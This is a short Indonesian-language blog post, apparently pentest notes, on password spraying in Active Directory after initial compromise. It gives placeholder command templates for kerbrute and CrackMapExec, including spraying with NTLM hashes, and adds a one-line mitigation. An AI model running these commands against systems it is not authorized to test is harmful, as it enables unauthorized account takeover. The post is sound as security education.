---
title: Password Spraying
date: 2022-03-06 15:48:22 +0700
categories: [Active Directory, Post Compromise Attack]
tags: [active directory, windows, password spraying, crackmapexec, kerbrute]     # TAG names should always be lowercase
author:
  name: Nairpaa
  link: https://nairpaa.github.io
---

**Password spraying** adalah serangan yang hampir mirip dengan *brute-force*, hanya saja ini dilakukan dengan 1 password dan banyak username. Biasanya dilakukan untuk mengecek penggunaan default password pada user lain. 

### Tujuan 

- *Privilege escalation*

### Prasyarat

- Memiliki kredensial user domain


### Tools

- CrackMapExec (CME)


## Tahapan eksploitasi
```bash
# kerbrute
➜ kerbrute passwordspray -d <domain> --dc <ip-dc> domain_users.txt <password>

# Spraying menggunakan password
➜ crackmapexec <smb/winrm/etc> <ip-target/network> -u <user> -p <password>
➜ crackmapexec <smb/winrm/etc> <ip-target/network> -u <user> -p <password> --continue-on-success | grep -F '[+]'

# Spraying menggunakan hash
➜ crackmapexec <smb/winrm/etc> <ip-target/network> -u <user> -H <SAM-hash>
```

![Password sparying menggunakan cme](/assets/img/posts/password-spraying/1.png)


## Mitigasi

Hindari penggunaan password default atau password yang sama.